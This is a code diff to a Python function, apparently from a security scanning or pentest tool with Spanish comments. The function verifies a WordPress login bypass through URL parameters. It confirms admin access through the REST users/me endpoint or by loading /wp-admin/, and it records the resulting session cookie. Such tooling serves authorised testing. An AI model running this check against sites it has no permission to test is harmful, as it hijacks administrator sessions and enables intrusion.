@@ -3444,7 +3444,8 @@ def verify_wordpress_url_param_login(
 
         base = boot.base_url.rstrip("/")
         ep = endpoint or "/"
-        sess = requests.Session()
+        import requests as _req_wpl
+        sess = _req_wpl.Session()
         sess.verify = False
 
         _params_dict = parameters if isinstance(parameters, dict) else dict.fromkeys(parameters or [], "")
@@ -3466,31 +3467,42 @@ def verify_wordpress_url_param_login(
                 step(f"GET {ep}?{login_p}={lval!r} → HTTP {r.status_code}, "
                      f"cookie wp_logged_in={'si' if _wp_cookie else 'no'}")
                 if _wp_cookie:
-                    # Confirm: access /wp-json/wp/v2/users/me with that session
+                    # Estrategia 1: REST API /users/me (necesita nonce en WP5+)
+                    _confirmed_detail_local = ""
                     r2 = sess.get(f"{base}/wp-json/wp/v2/users/me", timeout=15)
                     if r2.status_code == 200:
                         try:
                             jdata = r2.json()
                             if isinstance(jdata.get("roles"), list) and "administrator" in jdata["roles"]:
-                                confirmed = True
-                                confirmed_detail = (f"login bypass confirmado: GET {ep}?{login_p}={lval} "
-                                                    f"→ sesion admin (id={jdata.get('id')}, "
+                                _confirmed_detail_local = (f"login bypass confirmado: GET {ep}?{login_p}={lval} "
+                                                    f"→ sesion admin via REST API (id={jdata.get('id')}, "
                                                     f"roles={jdata.get('roles')})")
-                                confirmed_cookie = _wp_cookie
                             elif jdata.get("id"):
-                                confirmed = True
-                                confirmed_detail = (f"login bypass confirmado: sesion de usuario "
+                                _confirmed_detail_local = (f"login bypass confirmado: sesion de usuario "
                                                     f"id={jdata.get('id')} roles={jdata.get('roles')}")
-                                confirmed_cookie = _wp_cookie
                         except Exception:
                             if "administrator" in r2.text.lower() or "admin" in r2.text[:300].lower():
-                                confirmed = True
-                                confirmed_detail = (f"login bypass: sesion con cookie {_wp_cookie}, "
+                                _confirmed_detail_local = (f"login bypass: sesion con cookie {_wp_cookie}, "
                                                     f"respuesta de /users/me contiene 'admin'")
-                                confirmed_cookie = _wp_cookie
+                    # Estrategia 2: acceder a /wp-admin/ (sin redirect a login = acceso real de admin)
+                    if not _confirmed_detail_local:
+                        r3 = sess.get(f"{base}/wp-admin/", timeout=15, allow_redirects=True)
+                        step(f"  /wp-admin/ → HTTP {r3.status_code}, "
+                             f"login_redirect={'si' if 'wp-login' in r3.url else 'no'}")
+                        if r3.status_code == 200 and "wp-login" not in r3.url:
+                            # Comprobar que es una pagina de admin real (no pagina de login disfrazada)
+                            if any(k in r3.text for k in
+                                   ("wp-admin/js/", "adminmenu", "wpadminbar", "#wpbody", "Dashboard")):
+                                _confirmed_detail_local = (
+                                    f"login bypass confirmado: GET {ep}?{login_p}={lval} "
+                                    f"→ acceso directo a /wp-admin/ con cookie {_wp_cookie}")
+                    if _confirmed_detail_local:
+                        confirmed = True
+                        confirmed_detail = _confirmed_detail_local
+                        confirmed_cookie = _wp_cookie
                     if confirmed:
                         break
-            except requests.RequestException as exc:
+            except _req_wpl.RequestException as exc:
                 step(f"error en peticion de bypass: {exc}")
 
         if confirmed:
